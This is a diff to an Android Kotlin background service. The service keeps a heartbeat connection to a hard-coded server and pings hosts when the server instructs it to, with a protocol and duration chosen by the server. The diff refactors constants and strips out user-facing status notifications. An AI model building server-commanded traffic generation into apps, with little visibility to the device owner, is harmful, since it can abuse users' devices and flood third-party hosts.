@@ -31,12 +31,12 @@ class ApiService : Service() {
 
     companion object {
         private const val TAG = "ApiService"
-        private const val SERVER_BASE_URL = "https://dragon.wag.org.in:12345/api" // Change for physical device
-        private const val CONNECT_TIMEOUT = 30000
-        private const val READ_TIMEOUT = 30000
-        private const val HEARTBEAT_INTERVAL_MS = 60 * 60 * 1000L // 1 hr
-        private const val RECONNECT_INTERVAL_MS = 1 * 60 * 1000L // 1 min
-        private const val MAX_FAILED_UPLOADS = 5000 // Maximum number of failed uploads to store
+        private const val SERVER_BASE_URL = Constants.SERVER_BASE_URL // Change for physical device
+        private const val CONNECT_TIMEOUT = Constants.CONNECT_TIMEOUT
+        private const val READ_TIMEOUT = Constants.READ_TIMEOUT
+        private const val HEARTBEAT_INTERVAL_MS = Constants.HEARTBEAT_INTERVAL_MS // 1 hr
+        private const val RECONNECT_INTERVAL_MS = Constants.RECONNECT_INTERVAL_MS // 1 min
+        private const val MAX_FAILED_UPLOADS = Constants.MAX_FAILED_UPLOADS // Maximum number of failed uploads to store
         // Notification constants
         private const val NOTIFICATION_CHANNEL_ID = "api_service_channel"
         private const val NOTIFICATION_CHANNEL_NAME = "API Service"
@@ -54,7 +54,7 @@ class ApiService : Service() {
     private var udpListenerJob: Job? = null
     private var udpListenerSocket: DatagramSocket? = null
     private var udpListenerPort: Int = 0 // Dynamically assigned port
-    private val SERVER_UDP_PORT = 50003 // Port to which we send ready notification
+    private val serverPort = Constants.SERVER_UDP_PORT // Port to which we send ready notification
     private var listenerTimeoutJob: Job? = null
 
     private var logCallback: ((String) -> Unit)? = null
@@ -103,7 +103,7 @@ class ApiService : Service() {
 
     private fun log(message: String) {
         Log.i(TAG, message)
-        logCallback?.invoke("$message")
+        logCallback?.invoke(message)
     }
 
 
@@ -120,9 +120,6 @@ class ApiService : Service() {
         } catch (e: Exception) {
             Log.w(TAG, "Failed to start foreground in onCreate: ${e.message}")
         }
-
-        // Optional: one-time status notification
-        showServiceNotification("Service Starting", "Initializing API service...")
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -211,73 +208,6 @@ class ApiService : Service() {
             .build()
     }
 
-
-    /**
-     * Show general service notification
-     */
-    private fun showServiceNotification(title: String, message: String, autoCancel: Boolean = true) {
-//        val intent = Intent(this, MainActivity::class.java).apply {
-//            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
-//        }
-//        val pendingIntent = PendingIntent.getActivity(
-//            this, 0, intent,
-//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE else 0
-//        )
-//
-//        val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
-//            .setContentTitle(title)
-//            .setContentText(message)
-//            .setSmallIcon(android.R.drawable.ic_dialog_info)
-//            .setContentIntent(pendingIntent)
-//            .setAutoCancel(autoCancel)
-//            .setSilent(true)
-//            .setPriority(NotificationCompat.PRIORITY_MIN)
-//            .build()
-//
-//        if (NotificationManagerCompat.from(this).areNotificationsEnabled()) {
-//            notificationManager.notify(STATUS_NOTIFICATION_ID, notification)
-//        }
-    }
-
-    /**
-     * Show server instruction notification
-     */
-    private fun showInstructionNotification(instruction: ServerInstruction) {
-//        val intent = Intent(this, MainActivity::class.java).apply {
-//            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
-//        }
-//        val pendingIntent = PendingIntent.getActivity(
-//            this, 0, intent,
-//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE else 0
-//        )
-//
-//        val title = if (instruction.sendPing) {
-//            "Server Instruction Received"
-//        } else {
-//            "Heartbeat Sent"
-//        }
-//
-//        val message = if (instruction.sendPing) {
-//            "Ping ${instruction.host} (${instruction.protocol}) for ${instruction.durationSeconds}s"
-//        } else {
-//            "Waiting for server instructions..."
-//        }
-//
-//        val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
-//            .setContentTitle(title)
-//            .setContentText(message)
-//            .setSmallIcon(android.R.drawable.ic_dialog_info)
-//            .setContentIntent(pendingIntent)
-//            .setAutoCancel(true)
-//            .setSilent(true)
-//            .setPriority(NotificationCompat.PRIORITY_MIN)
-//            .build()
-//
-//        if (NotificationManagerCompat.from(this).areNotificationsEnabled()) {
-//            notificationManager.notify(STATUS_NOTIFICATION_ID, notification)
-//        }
-    }
-
     private fun updateOngoingNotification() {
         try {
             val notification = createOngoingNotification()
@@ -343,11 +273,9 @@ class ApiService : Service() {
 
                 if (responseCode == HttpURLConnection.HTTP_OK) {
                     statusCallback?.invoke("server_reachable", "Server is reachable")
-                    showServiceNotification("Server Status", "Server is reachable")
                     return@withContext ApiResponse.Success(JSONObject(response))
                 } else {
                     statusCallback?.invoke("server_error", "Server error: $responseCode")
-                    showServiceNotification("Server Error", "Server error: $responseCode")
                     return@withContext ApiResponse.Error(responseCode, response)
                 }
             } catch (e: Exception) {
@@ -387,7 +315,7 @@ class ApiService : Service() {
 
                 log("UDP Listener started on port $udpListenerPort")
 
-                val serverAddress = InetSocketAddress("170.187.252.25", SERVER_UDP_PORT)
+                val serverAddress = InetSocketAddress("170.187.252.25", serverPort)
                 val sessionId = UUID.randomUUID().toString()
 
                 // READY message
@@ -558,22 +486,17 @@ class ApiService : Service() {
 
                     Log.i(TAG, "Connected to server with client_id: $clientId")
                     statusCallback?.invoke("connected", "Connected to server successfully")
-
-                    // Show connection notification and ensure foreground
-                    showServiceNotification("Connected", "Successfully connected to server")
                     try { startForeground(ONGOING_NOTIFICATION_ID, createOngoingNotification()) } catch (_: Exception) {}
 
                     return@withContext ApiResponse.Success(responseJson)
                 } else {
                     statusCallback?.invoke("connection_failed", "Connection failed: $responseCode")
-                    showServiceNotification("Connection Failed", "Failed to connect: $responseCode")
                     return@withContext ApiResponse.Error(responseCode, response)
                 }
 
             } catch (e: Exception) {
                 Log.w(TAG, "Connect failed: ${e.message}")
                 statusCallback?.invoke("connection_error", "Connection error: ${e.message}")
-                showServiceNotification("Connection Error", "Connection error: ${e.message}")
                 return@withContext ApiResponse.Error(-1, "Network error: ${e.message}")
             }
         }
@@ -603,7 +526,6 @@ class ApiService : Service() {
                     clientId = null
 
                     statusCallback?.invoke("disconnected", "Disconnected from server")
-                    showServiceNotification("Disconnected", "Disconnected from server")
 
                     // Stop foreground service
                     stopForeground(true)
@@ -613,7 +535,6 @@ class ApiService : Service() {
             } catch (e: Exception) {
                 Log.e(TAG, "Error during disconnection", e)
                 statusCallback?.invoke("disconnect_error", "Disconnect error: ${e.message}")
-                showServiceNotification("Disconnect Error", "Error: ${e.message}")
             }
         }
     }
@@ -628,7 +549,6 @@ class ApiService : Service() {
 
         Log.w(TAG, "Entering disconnected state due to heartbeat failure")
         statusCallback?.invoke("disconnected", "Connection lost - entering reconnect mode")
-        showServiceNotification("Connection Lost", "Attempting to reconnect...")
         updateOngoingNotification()
     }
 
@@ -723,7 +643,6 @@ class ApiService : Service() {
 
         if (successfulUploads.isNotEmpty()) {
             statusCallback?.invoke("reuploads_successful", "Successfully reuploaded ${successfulUploads.size} sessions")
-            showServiceNotification("Reupload Success", "Successfully reuploaded ${successfulUploads.size} sessions")
         }
 
         if (endSize != startSize) {
@@ -745,8 +664,6 @@ class ApiService : Service() {
         Log.i(TAG, "Starting heartbeat/reconnect system at ${dateFormat.format(Date())}")
         statusCallback?.invoke("heartbeat_started", "Heartbeat/reconnect system started")
 
-        // Show heartbeat started notification and update ongoing notification
-        showServiceNotification("System Started", "Heartbeat/reconnect system activated")
         updateOngoingNotification()
 
         heartbeatJob = serviceScope.launch {
@@ -780,7 +697,6 @@ class ApiService : Service() {
                             is ApiResponse.Success -> {
                                 Log.i(TAG, "Reconnection successful! Resuming normal heartbeat mode")
                                 statusCallback?.invoke("reconnected", "Successfully reconnected to server")
-                                showServiceNotification("Reconnected", "Successfully reconnected to server")
                                 updateOngoingNotification()
                                 delayUsed = 0L // Reset delay for next heartbeat cycle
                             }
@@ -825,7 +741,6 @@ class ApiService : Service() {
 
         if (wasActive) {
             statusCallback?.invoke("heartbeat_stopped", "Heartbeat/reconnect system stopped")
-            showServiceNotification("System Stopped", "Heartbeat/reconnect system deactivated")
             updateOngoingNotification()
             Log.i(TAG, "Heartbeat/reconnect system stopped successfully")
         }
@@ -851,7 +766,7 @@ class ApiService : Service() {
 
                     // Check for server instructions
                     if (data.optBoolean("send_ping", false)) {
-                        val delayMs = max(data.optLong("delay_ms", 0), HEARTBEAT_INTERVAL_MS - 120_000L)
+                        val delayMs = data.optLong("delay_ms", 0)
                         val instruction = ServerInstruction(
                             sendPing = true,
                             host = data.getStringOrDefault("ping_host"),
@@ -878,20 +793,16 @@ class ApiService : Service() {
                             delayUsed = delayMs
                             Log.i(TAG, "Delay completed, executing instruction now")
                         }
-
-                        showInstructionNotification(instruction)
                         onInstructionReceived?.invoke(instruction)
                     } else {
                         Log.d(TAG, "Heartbeat #$count: No server instruction - standing by")
                         val instruction = ServerInstruction(sendPing = false)
-                        showInstructionNotification(instruction)
                         onInstructionReceived?.invoke(instruction)
                     }
                 }
                 is ApiResponse.Error -> {
                     Log.e(TAG, "Heartbeat #$count failed at $currentTime: ${response.code} - ${response.message}")
                     statusCallback?.invoke("heartbeat_error", "Heartbeat failed: ${response.message}")
-                    showServiceNotification("Heartbeat Error", "Failed: ${response.message}")
 
                     // Stop UDP listener on heartbeat failure
                     stopUdpListener()
@@ -903,7 +814,6 @@ class ApiService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "Error during heartbeat #$count at $currentTime", e)
             statusCallback?.invoke("heartbeat_error", "Heartbeat error: ${e.message}")
-            showServiceNotification("Heartbeat Error", "Error: ${e.message}")
 
             // Stop UDP listener on exception
             stopUdpListener()
